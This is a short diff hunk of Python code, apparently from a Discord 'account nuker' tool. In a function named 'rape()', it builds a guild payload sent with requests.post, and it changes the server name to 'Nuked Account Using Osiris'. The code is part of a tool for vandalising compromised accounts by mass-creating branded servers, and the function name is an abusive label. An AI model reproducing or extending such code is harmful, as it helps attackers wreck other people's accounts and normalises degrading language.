@@ -80,7 +80,7 @@ def rape():
     guild = {
         "channels" : None,
         "icon" : None,
-        "name" : "lol",
+        "name" : "Nuked Account Using Osiris",
         "region" : "japan"
     }
     requests.post(
